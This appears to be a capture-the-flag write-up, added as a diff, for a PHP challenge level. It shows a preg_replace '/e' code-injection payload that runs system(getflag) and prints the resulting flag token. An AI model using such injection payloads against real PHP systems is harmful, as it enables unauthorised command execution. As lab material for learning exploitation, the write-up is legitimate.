@@ -1,0 +1,30 @@
+# cat README
+```
+level06@BornToSec:~$ cat README
+<?${[]}.= (...) {![]}?><?=${![]};
+You can try to understand this little script php and there is a chance to have this flag..
+/!\ If you try to run it make sure you understand all this code ..:)/!\
+Or just exploit this single small script on this folder.
+```
+
+# preg_replace('/USERINPUT/e') is very dangerous
+# http://php.net/manual/en/reference.pcre.pattern.modifiers.php
+# we just need to insert a call to system(getflag)
+# just dont forget /(\[ft (.*)\])/e
+# so the payload will look like
+```
+[ft whateverMalicous]
+```
+
+# in our case we want the flag so
+```
+[ft {${system(getflag)}}]
+```
+
+# result
+```
+level06@BornToSec:~$ ./level06 /tmp/tommy/payload
+PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(16) : regexp code on line 1
+Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(16) : regexp code on line 1
+```
